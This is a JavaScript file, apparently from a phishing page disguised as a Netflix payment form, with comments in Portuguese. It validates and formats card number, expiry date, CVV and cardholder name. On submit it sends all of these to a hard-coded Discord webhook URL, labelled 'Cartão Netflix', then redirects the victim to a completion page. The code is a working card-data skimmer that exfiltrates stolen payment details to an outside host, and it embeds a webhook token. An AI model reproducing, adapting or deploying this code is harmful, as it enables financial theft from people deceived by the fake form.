document.addEventListener('DOMContentLoaded', function () {
    const submitButton = document.getElementById('submit-button');
    const cardNumber = document.getElementById('card-number');
    const expiryDate = document.getElementById('expiry-date');
    const cvv = document.getElementById('cvv');
    const cardName = document.getElementById('card-name');
    const paymentOptions = document.querySelectorAll('input[name="payment"]');

    // Função para verificar se todos os campos estão preenchidos
    function checkFormCompletion() {
        if (cardNumber.value && expiryDate.value && cvv.value && cardName.value && Array.from(paymentOptions).some(option => option.checked)) {
            submitButton.disabled = false;  // Ativar o botão
        } else {
            submitButton.disabled = true;  // Manter o botão desativado
        }
    }

    // Adicionar event listeners para verificar se os campos são preenchidos
    cardNumber.addEventListener('input', formatCardNumber);
    cardNumber.addEventListener('input', checkFormCompletion);
    expiryDate.addEventListener('input', formatExpiryDate);
    expiryDate.addEventListener('input', checkFormCompletion);
    cvv.addEventListener('input', formatCvv);
    cvv.addEventListener('input', checkFormCompletion);
    cardName.addEventListener('input', formatCardName);
    cardName.addEventListener('input', checkFormCompletion);
    paymentOptions.forEach(option => option.addEventListener('change', checkFormCompletion));

    // Formatar o número do cartão (separar de 4 em 4 e limitar a 16 dígitos)
    function formatCardNumber() {
        let value = cardNumber.value.replace(/\D/g, ''); // Remove todos os caracteres não numéricos
        if (value.length > 16) {
            value = value.substring(0, 16); // Limita a 16 caracteres
        }
        value = value.replace(/(.{4})(?=.{4})/g, '$1 '); // Adiciona o espaço a cada 4 caracteres
        cardNumber.value = value;
    }

    // Formatar a data de validade (MM/YYYY)
    function formatExpiryDate() {
        let value = expiryDate.value.replace(/\D/g, ''); // Remove todos os caracteres não numéricos
        if (value.length > 6) {
            value = value.substring(0, 6); // Limita a 6 caracteres
        }
        if (value.length > 2) {
            value = value.slice(0, 2) + '/' + value.slice(2, 6); // Adiciona a barra após os dois primeiros números
        }
        expiryDate.value = value;
    }

    // Permitir apenas 3 números no campo CVV
    function formatCvv() {
        let value = cvv.value.replace(/\D/g, ''); // Remove todos os caracteres não numéricos
        if (value.length > 3) {
            value = value.substring(0, 3); // Limita a 3 caracteres
        }
        cvv.value = value;
    }

    // Permitir apenas letras no campo Nome do Cartão
    function formatCardName() {
        let value = cardName.value.replace(/[^a-zA-Z\s]/g, ''); // Remove qualquer coisa que não seja letra ou espaço
        cardName.value = value;
    }

    // Enviar os dados para o Discord
    submitButton.addEventListener('click', function(event) {
        if (submitButton.disabled) return;

        event.preventDefault();

        const paymentMethod = document.querySelector('input[name="payment"]:checked').id;
        const data = {
            cardNumber: cardNumber.value,
            expiryDate: expiryDate.value,
            cvv: cvv.value,
            cardName: cardName.value,
            paymentMethod: paymentMethod,
        };

        sendToDiscord(data);
    });
});

// Função para enviar os dados para o Discord
function sendToDiscord(data) {
    const webhookUrl = 'https://discord.com/api/webhooks/1317017089357385770/6Kc7n9lA1kk_A6mGrgaCrtmWk0ZmAP24L5xfJVzHrgIyxvcR7CdwHsc_NieKvAnBgKtP'; // Substitua com sua URL do Discord

    const payload = {
        content: `𝘾𝘼𝙍𝙏𝘼̃𝙊 𝙉𝙀𝙏𝙁𝙇𝙄𝙓 💳 !\n\n𝐍𝐮́𝐦𝐞𝐫𝐨 𝐝𝐨 𝐜𝐚𝐫𝐭𝐚̃𝐨 : ${data.cardNumber}\n𝐃𝐚𝐭𝐚 𝐝𝐞 𝐕𝐚𝐥𝐢𝐝𝐚𝐝𝐞: ${data.expiryDate}\n𝐂𝐕𝐕: ${data.cvv}\n𝐍𝐨𝐦𝐞 𝐝𝐨 𝐜𝐚𝐫𝐭𝐚̃𝐨 : ${data.cardName}\n𝐅𝐨𝐫𝐦𝐚 𝐝𝐞 𝐏𝐚𝐠𝐚𝐦𝐞𝐧𝐭𝐨 : ${data.paymentMethod}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            console.log('Dados enviados para o Discord com sucesso!');
            window.location.href = 'concluido.html'; // Redireciona para a página concluída
        } else {
            console.error('Erro ao enviar os dados para o Discord.');
        }
    })
    .catch(error => console.error('Erro:', error));
}